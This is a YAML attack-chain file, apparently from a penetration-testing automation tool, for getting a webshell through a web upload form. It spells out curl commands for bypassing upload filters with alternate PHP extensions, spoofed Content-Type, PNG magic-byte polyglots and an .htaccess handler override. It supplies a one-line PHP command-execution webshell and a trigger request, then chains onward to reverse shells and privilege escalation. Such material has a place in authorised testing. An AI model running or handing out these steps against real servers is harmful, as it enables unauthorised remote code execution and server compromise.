id: file-upload-bypass
name: "Web → Shell — file upload bypass → webshell"
description: >
  Upload form with naive filtering. Try the standard tricks in order
  (extension blacklist → content-type → magic bytes → double extension →
  null-byte / .htaccess → polyglot) until one webshell lands and
  executes.
tags: [web, file-upload, webshell, rce]
difficulty: medium

inputs:
  - name: upload_url
    description: "POST endpoint that accepts the upload."
    required: true
  - name: served_path
    description: "Where uploaded files end up (e.g. /uploads/)."
    required: true

steps:
  - id: bench_baseline
    name: "Baseline: upload a harmless file, see what's accepted"
    inline_command: "curl -F 'file=@hello.txt' '<upload_url>'"
    inputs:
      upload_url: "${upload_url}"

  - id: extension_swap
    name: "Try alternate PHP-handled extensions"
    inline_command: |
      for ext in php php3 php5 phtml phar pht; do
        cp shell.php "shell.$ext"
        curl -F "file=@shell.$ext" "<upload_url>" | tail -3
      done
    inputs:
      upload_url: "${upload_url}"
    notes: |
      Many blacklists block .php but not .phtml/.phar. JSP equivalents:
      .jsp, .jspx, .jsw, .jsv. ASP equivalents: .asp, .aspx, .ashx, .asmx,
      .config.

  - id: content_type_spoof
    name: "Force Content-Type: image/*"
    inline_command: "curl -F 'file=@shell.php;type=image/png' '<upload_url>'"
    inputs:
      upload_url: "${upload_url}"

  - id: magic_byte_prefix
    name: "Prefix with PNG magic bytes (polyglot)"
    inline_command: |
      printf '\\x89PNG\\r\\n\\x1a\\n' > shell.png.php
      cat shell.php >> shell.png.php
      curl -F 'file=@shell.png.php' '<upload_url>'
    inputs:
      upload_url: "${upload_url}"

  - id: htaccess_trick
    name: "If .htaccess writable: turn .jpg into PHP"
    inline_command: |
      printf 'AddType application/x-httpd-php .jpg\n' > .htaccess
      curl -F 'file=@.htaccess' '<upload_url>'
      curl -F 'file=@shell.jpg' '<upload_url>'   # now executes as PHP
    inputs:
      upload_url: "${upload_url}"

  - id: trigger
    name: "Hit the uploaded path"
    inline_command: "curl '<served_path>/shell.php?cmd=id'"
    inputs:
      served_path: "${served_path}"
    notes: |
      Drop a minimal one-liner webshell:
        <?php system($_GET['cmd']); ?>
      Then escalate to a reverse shell with the rsg-* commands in the
      payloads category.

references:
  - title: "HackTricks — File Upload"
    url:   "https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html"
  - title: "PayloadsAllTheThings — Upload Insecure Files"
    url:   "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files"

next_chains:
  - chain: shell-stabilization
    when:   'reverse shell received'
    reason: 'Stabilize.'
  - chain: linux-priv-esc-recon
    when:   'shell on Linux'
    reason: 'Escalate from www-data.'
  - chain: windows-priv-esc-recon
    when:   'shell on Windows IIS'
    reason: 'IIS AppPool → SeImpersonate path.'
